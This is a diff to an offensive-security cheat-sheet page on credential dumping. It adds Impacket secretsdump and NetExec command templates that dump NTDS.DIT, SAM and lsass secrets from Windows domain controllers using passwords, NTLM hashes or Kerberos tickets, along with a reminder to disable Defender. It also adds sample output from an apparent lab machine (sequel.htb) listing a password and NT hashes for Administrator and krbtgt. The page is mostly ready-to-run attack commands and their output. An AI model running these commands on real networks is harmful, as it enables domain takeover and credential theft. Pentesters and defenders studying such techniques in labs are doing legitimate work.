@@ -1,7 +1,9 @@
 ---
 title: "Secrets Dump"
-tags: ["SAM", "SYSTEM", "SECURITY", "DCSync", "Impacket", "secretsdump", "Domain Controller", "Credential Dumping", "Active Directory", "Windows", "NTDS.DIT", "Hive", "LAPS"]
+tags: ["Active Directory", "Secrets Dump", "Credential Dumping", "DCSync", "Domain Controller", "Hive", "Impacket", "LAPS", "NTDS.DIT", "SAM", "SECURITY", "SYSTEM", "Windows"]
 ---
+
+{{< filter_buttons >}}
 
 #### Convert NTDS.DIT to .sqlite
 
@@ -112,26 +114,126 @@ mimikatz -- '"lsadump::sam /system:C:\SYSTEM /sam:C:\SAM"'
 {{< tab set3 tab4 >}}sliver{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-```console
+```console {class="password"}
 # Password
-impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>'
 ```
 
-```console
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="ntlm"}
 # NTLM
-impacket-secretsdump '<DOMAIN>/<USER>@<DC>' -hashes ':<HASH>'
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH>
 ```
 
-```console
-# Kerberos
-impacket-secretsdump -k -no-pass -dc-ip <DC_IP> <DC>
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<TARGET>' -k
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper:NuclearMosquito3@dc.sequel.htb' -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] CCache file is not found. Skipping...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -hashes :98981eed8e9ce0763bb3c5b3c7ed5945 -k
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[-] CCache file is not found. Skipping...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass
+```
+
+```console {class="sample-code"}
+$ impacket-secretsdump 'sequel.htb/ryan.cooper@dc.sequel.htb' -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::
+---[SNIP]---
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set3 tab2 >}}
 
-```console
-nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H <HASH> --ntds
+```console {class="password"}
+# Password
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --ntds
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' --ntds
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> --ntds
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> --ntds
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc smb <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache --ntds
 ```
 
 {{< /tabcontent >}}
@@ -165,17 +267,30 @@ mimikatz -- '"lsadump::dcsync /all"' "exit"
 {{< tab set4 tab4 >}}sliver{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
-```console
-impacket-secretsdump '<USER>:<PASSWORD>@<TARGET_DOMAIN>'
+```console {class="password"}
+# Password
+impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
+```
+
+```console {class="ntlm"}
+# NTLM
+impacket-secretsdump '<USER>@<TARGET>' -hashes :<HASH>
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set4 tab2 >}}
 
-```console
-# Disable defender
-nxc smb <TARGET_DOMAIN> -u 'administrator' -p '<PASSWORD>' --local-auth -M lsassy 
+```console {class="password"}
+# Password
+nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M lsassy 
 ```
+
+```console {class="ntlm"}
+# NTLM
+nxc smb <TARGET> -u '<USER>' -H <HASH> --local-auth -M lsassy 
+```
+
+<small>*Note: Disable Defender*</small>
 
 {{< /tabcontent >}}
 {{< tabcontent set4 tab3 >}}
